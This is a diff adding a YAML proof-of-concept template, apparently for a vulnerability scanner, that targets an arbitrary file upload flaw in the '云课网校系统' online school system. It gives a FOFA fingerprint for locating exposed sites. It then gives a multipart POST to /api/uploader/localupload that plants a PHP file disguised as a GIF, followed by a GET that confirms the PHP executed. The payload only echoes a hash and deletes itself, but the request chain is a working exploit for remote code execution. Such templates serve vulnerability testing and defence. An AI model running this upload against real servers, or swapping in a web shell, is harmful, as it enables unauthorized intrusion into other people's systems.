@@ -1,0 +1,32 @@
+id: poc-yaml-yunknet-localupload-anyfile-upload
+info:
+  name: 云课网校系统 localupload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 云课网校系统
+  fofa: body="云课网校系统"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/uploader/localupload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: image/gif
+
+
+    <?php echo md5({{.t1}});unlink(__FILE__);?>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: "status_code == 200 && \ncontains(body,\"\\\"success\\\":true\") &&\n\
+    contains(body,\".php\") &&\ncontains(content_type,\"application/json\")\n"
+- method: GET
+  path: /upload/video/0/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
